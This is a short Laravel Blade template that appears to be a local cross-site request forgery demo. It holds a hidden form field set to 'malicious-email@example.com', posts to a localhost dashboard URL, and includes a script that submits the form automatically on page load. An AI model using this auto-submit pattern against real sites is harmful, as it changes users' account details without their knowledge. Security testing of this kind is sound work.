@extends('master')

@section('content')
    <div class="d-flex flex-column-fluid">
        <!--begin::Container-->
        <div class="container-fluid">

            <div class="alert alert-warning" role="alert">
                Simple infor alert check it out
            </div>

            <form action="http://localhost:8000/dashboard" method="POST">
                @csrf
                <input type="hidden" name="email" value="malicious-email@example.com">

                <button type="submit">Submit</button>
            </form>

            <script>
                document.forms[0].submit();
            </script>
        </div>
    </div>
@endsection


